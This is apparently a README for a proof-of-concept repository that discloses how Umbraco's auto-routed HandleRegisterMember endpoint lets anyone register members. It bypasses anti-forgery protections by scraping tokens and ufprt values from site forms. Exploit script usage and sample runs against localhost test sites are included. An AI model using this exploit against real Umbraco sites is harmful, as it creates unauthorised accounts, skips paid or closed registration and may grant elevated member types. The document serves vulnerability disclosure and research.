# UmbRegister-Spoofer

## Background

Since version 6.2.0 Umbraco has shipped with a few macro snippets relating to membership. These allow developers to get started with implementing common membership features such as registration and login. Because these snippets require server-side processing, Umbraco also ships with some surface controllers which are _auto-routed_. This means that the endpoints are exposed on _every_ Umbraco site, regardless of whether they use membership or not. One of these controllers is the `UmbRegisterController` which contains a single method, `HandleRegisterMember`. This method creates a new member in the Umbraco database.

If you don't use membership on the front-end of your site then the worst an attacker can do with this is fill your database up with useless members and potentially cause a denial of service. If you do use membership then it may allow an attacker to bypass your existing registration process and any validation you may be doing as part of it (perhaps you require payment, or maybe you don't have a public registration form at all and you create the members yourself in the backoffice).

Using this method it would also be possible for an attacker to create an account with a different member type than you intended, possibly with elevated privileges (this would actually be possible on any site that binds to the `RegisterModel` in their registration form and passes it directly to the `MembershipHelper.RegisterMember` method).

Umbraco 7.13.0 and 8.0.0 attempted to solve this issue by adding `[ValidateAntiForgeryToken]` attributes on these controllers. However, this only prevented CSRF attacks (see my other repo about `UmbProfileController` for an example). It was still possible to poke `HandleRegisterMember` by grabbing the anti-forgery cookie and token from an existing form on the site.

Umbraco 7.15.0 and 8.1.0 further attempted to solve this in a way I don't fully understand yet, but I've discovered it can be exploited by grabbing both the anti-forgery token and `ufprt` fields from an existing form on the site (as opposted to just the anti-forgery token in previous versions). Interestingly it also possible to use _only_ the anti-forgery token from a form that was created using `Html.BeginForm` (as opposed to `Html.BeginUmbracoForm` - credit to Ronald Barendse for discovering this which prompted me to investigate further).

## Exploitation

This repository contains a Python script which can crawl an Umbraco site to search for anti-forgery tokens and use them to poke the `HandleRegisterMember` endpoint:

```
usage: umbregister_spoofer.py [-h] [--crawl] [--name NAME] [--email EMAIL]
                              [--username USERNAME] [--password PASSWORD]
                              [--type TYPE]
                              URL

Attempt to create an member account on an Umbraco site using the public `HandleRegisterMember` endpoint.

positional arguments:
  URL                   the base URL of the Umbraco site

optional arguments:
  -h, --help            show this help message and exit
  --crawl, -C           crawl the site to find an anti-forgery cookie, token,
                        and ufprt to send with the request
  --name NAME, -n NAME  the new member's name
  --email EMAIL, -e EMAIL
                        the new member's email address
  --username USERNAME, -u USERNAME
                        the new member's username
  --password PASSWORD, -p PASSWORD
                        the new member's password
  --type TYPE, -t TYPE  the member type alias

Note that it is necessary to crawl for the anti-forgery tokens in Umbraco versions 7.13 and up.
```

This script was developed under Python 3.7.4 but may work with other versions. Note that it will always result in an HTTP 500 error which may or may not mean that it succeeded (you will need to check the backoffice or attempt a login).

### Examples

The included Visual Studio solution contains a number of target projects running different versions of Umbraco. Each of them contains a dummy contact form from which tokens can be extracted.

#### Umbraco 6.2.0-7.12.4

The endpoint can be acessed without a token so we can run the script with just the URL parameter.

```
$ python umbregister_spoofer.py https://localhost:44303/
Request URL: https://localhost:44303/Umbraco/Surface/UmbRegister/HandleRegisterMember
Parameters:
{'registerModel.Email': 'neo@matrix.com',
 'registerModel.Name': 'Neo',
 'registerModel.Password': 'Umbraco12345!',
 'registerModel.Username': 'N30'}
HTTP Error 500: Internal Server Error
```

#### Umbraco 7.13.0-8.1.0

Pass the `-C` parameter to tell the script to crawl the site to find tokens:

```
$ python umbregister_spoofer.py -C https://localhost:44389/
Crawling URL: https://localhost:44389/
- Anti-forgery cookie not present. Continuing to crawl...
Crawling URL: https://localhost:44389/blog/
- Anti-forgery cookie not present. Continuing to crawl...
Crawling URL: https://localhost:44389/contact/
- Found anti-forgery cookie.
- Found anti-forgery token and ufprt. This should be everything we need.
- Stop crawling and proceed with exploit? [Y/N] Y
Request URL: https://localhost:44389/Umbraco/Surface/UmbRegister/HandleRegisterMember
Parameters:
{'__RequestVerificationToken': 'egnI0UOSQl730fgxLvgEBMiy8KF_GSq3DA8bupvXVPaLWnsE3GipRnmvatyBK2j5mHGouf53Zmw7jhX4wSWlQA7Uh_5U-I9T9lGbsquH2QxmNz4MufOc3patEyN9t1zE3ajIbtYcX8ZfEvS6I6eIROHF3GmCVbhfzVijbbbaTjYFdEOSUN9imjvXqbXqpoxjYIlR9dQtk2Ys2n5awT1_akxAYVm754MaC3rDXg_5J3mWbsx3IpNhZzFsunknYN5hK611i2HLaKizzpxaLl1AN9DRV6CAtccUBivc4Uq4-LAWfTBIhYgySBvzhC38MUq2bbMc6Aymii3u_DcMLRtHqELiWMNET1oKwIrRXIaxah9l3G7u0Jm8L0xOOIT0zeBnBUqhjEVess2HIX4gaIVzbx4uhPKBZopt4urHdDa5CEJXGViq_-AysB9IxEOBwungTdT4gR7bVH8Zr_pguAFLSCAbsW_xV-YyV7--6zBtJoCwdraLUBo9UyL81JBqmaUzBURwzsGoMGjKt6hZk6RFphOdATxUd1x8bIloR3gcMkkhOteMpIVMPoZz4eD11gJ90',
 'registerModel.Email': 'neo@matrix.com',
 'registerModel.Name': 'Neo',
 'registerModel.Password': 'Umbraco12345!',
 'registerModel.Username': 'N30',
 'ufprt': '90194FDCDDE128A19688E33985018BABFB7E1FE853413A9249401336B5DFAB456130C8026245F6B7AEB73485504A99972B4218BA92CDD70FF54A6BC844EAC65B3D19FC8B45CF85645D61240254B0F56DDD8DF0082118647AD10BF8A1174B30B808B64C1B47A33F7683A228144166B18F21E262A8F9AADA45938D63EC4AF967A036F735CAC7B57B2E845126D001B388DD'}
HTTP Error 500: Internal Server Error
```
